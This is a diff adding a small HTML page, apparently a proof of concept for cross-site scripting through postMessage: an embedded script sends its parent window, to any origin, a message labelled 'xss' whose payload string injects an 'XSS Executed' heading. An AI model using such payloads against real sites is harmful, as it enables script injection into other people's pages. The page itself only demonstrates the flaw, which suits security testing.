@@ -1,0 +1,12 @@
+<!-- dd.html -->
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    window.parent.postMessage({
+      type: "xss",
+      payload: "document.body.insertAdjacentHTML('beforeend', '<h2 style=\\\"color:red\\\">✅ XSS Executed</h2>')"
+    }, "*");
+  </script>
+</body>
+</html>
